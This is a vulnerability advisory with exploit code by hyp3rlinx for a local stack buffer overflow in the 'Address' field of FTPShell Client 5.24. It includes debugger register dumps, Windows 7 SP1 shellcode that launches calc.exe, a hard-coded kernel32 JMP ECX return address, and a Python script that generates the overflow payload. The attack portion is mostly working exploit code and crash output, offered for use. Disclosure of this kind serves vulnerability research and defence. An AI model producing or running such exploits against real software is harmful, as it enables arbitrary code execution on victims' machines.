'''
[+] Credits: hyp3rlinx

[+] Website: hyp3rlinx.altervista.org

[+] Source:
http://hyp3rlinx.altervista.org/advisories/FTPSHELL-v5.24-BUFFER-OVERFLOW.txt


Vendor:
================================
www.ftpshell.com


Product:
================================
FTPShell Client version 5.24

FTPShell client is a windows file transfer program that enables users to
reliably transfer files,
upload to websites, and download updates from the internet.


Vulnerability Type:
===================
Buffer Overflow


CVE Reference:
==============
N/A


Vulnerability Details:
=====================
ftpshell.exe client has a buffer overflow entry point in the 'Address'
input field used to connect to an FTP server.
Allowing local arbitrary code execution by overwriting several registers on
the stack and controlling program execution flow.
EIP register will be used to jump to our malicious shellcode which will be
patiently waiting in ECX register.

exploited registers dump...

EAX 00000021
ECX 0012E5B0
EDX 76F670B4 ntdll.KiFastSystemCallRet
EBX 76244FC4 kernel32.76244FC4
ESP 0012E658 ASCII "calc.exe"   <--------- BAM!
EBP 7621E5FD kernel32.WinExec
ESI 001D2930
EDI 76244FEC kernel32.76244FEC
EIP 015FB945
C 0  ES 0023 32bit 0(FFFFFFFF)
P 1  CS 001B 32bit 0(FFFFFFFF)
A 0  SS 0023 32bit 0(FFFFFFFF)
Z 1  DS 0023 32bit 0(FFFFFFFF)
S 0  FS 003B 32bit 7FFDE000(FFF)
T 0  GS 0000 NULL
D 0
O 0  LastErr ERROR_SUCCESS (00000000)
EFL 00200246 (NO,NB,E,BE,NS,PE,GE,LE)
ST0 empty g
ST1 empty g
ST2 empty g
ST3 empty g
ST4 empty g
ST5 empty g
ST6 empty g
ST7 empty g
               3 2 1 0      E S P U O Z D I
FST C5E1  Cond 1 1 0 1  Err 1 1 1 0 0 0 0 1  (Unordered)
FCW 1372  Prec NEAR,64  Mask    1 1 0 0 1 0


test stack dump....

(3b8.fa0): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
*** WARNING: Unable to verify checksum for ftpshell.exe
*** ERROR: Symbol file could not be found.  Defaulted to export symbols for
ftpshell.exe -
eax=41414141 ebx=017ebc70 ecx=017ebc70 edx=0012ebc8 esi=0012ebc8
edi=017a9498
eip=41414141 esp=0012e928 ebp=0012ea70 iopl=0         nv up ei pl nz na po
nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000
efl=00210202
41414141 ??              ???


Exploit code(s):
===============
'''

import struct

#FTPShell Client version 5.24 - www.ftpshell.com
#Buffer Overflow Exploit
#by hyp3rlinx
#run to generate payload, then copy and inject
#into the 'Address' field on the client and BOOM!

#shellcode to pop calc.exe Windows 7 SP1
sc=("\x31\xF6\x56\x64\x8B\x76\x30\x8B\x76\x0C\x8B\x76\x1C\x8B"
"\x6E\x08\x8B\x36\x8B\x5D\x3C\x8B\x5C\x1D\x78\x01\xEB\x8B"
"\x4B\x18\x8B\x7B\x20\x01\xEF\x8B\x7C\x8F\xFC\x01\xEF\x31"
"\xC0\x99\x32\x17\x66\xC1\xCA\x01\xAE\x75\xF7\x66\x81\xFA"
"\x10\xF5\xE0\xE2\x75\xCF\x8B\x53\x24\x01\xEA\x0F\xB7\x14"
"\x4A\x8B\x7B\x1C\x01\xEF\x03\x2C\x97\x68\x2E\x65\x78\x65"
"\x68\x63\x61\x6C\x63\x54\x87\x04\x24\x50\xFF\xD5\xCC")


#payload="A"*2475+"R"*4+"\xcc"*100  #<---- control EIP register

#find appropriate assembly instruction to call our payload JMP or CALL ECX.
#!mona jmp -r ecx -m kernel32.dll

eip=struct.pack('<L', 0x761C1FDC)    #jmp ecx kernel32.dll
payload="A"*2475+eip+sc              #<----- direct EIP overwrite no NOPs
no nothing... BOOOOOM!!!

file=open("C:\\ftpshell-exploit","w")
file.write(payload)
file.close()


'''
Disclosure Timeline:
========================================
Vendor Notification:  NR
December 29, 2015  : Public Disclosure



Exploitation Technique:
=======================
Local



Severity Level:
================
High



Description:
==========================================================


Request Method(s):              [+]  Local Injection


Vulnerable Product:             [+]  FTPShell Client version 5.24


Vulnerable Parameter(s):        [+] 'Address'



===========================================================

[+] Disclaimer
Permission is hereby granted for the redistribution of this advisory,
provided that it is not altered except by reformatting it, and that due
credit is given. Permission is explicitly given for insertion in
vulnerability databases and similar, provided that due credit is given to
the author.
The author is not responsible for any misuse of the information contained
herein and prohibits any malicious use of all security related information
or exploits by the author or elsewhere.

by hyp3rlinx
'''